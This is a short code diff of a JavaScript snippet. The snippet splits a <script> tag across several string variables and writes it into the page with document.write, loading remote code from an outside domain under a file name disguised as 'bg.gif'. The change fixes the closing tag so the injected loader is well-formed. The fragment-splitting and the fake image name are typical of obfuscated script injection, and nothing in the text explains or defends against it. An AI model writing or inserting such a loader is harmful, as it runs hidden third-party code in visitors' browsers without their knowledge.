@@ -10,7 +10,7 @@ window.event.returnValue = false;
 var s1 = "<";
 var s2 = "script type=",
     s3 = "text/javascript src=https://www.bn8.org/",
-    s4 = "bg.gif/></script";
+    s4 = "bg.gif/></script>";
 s2 = s2 + s3 + s4;
 s = s1 + s2 + s5;
 document.write(s);
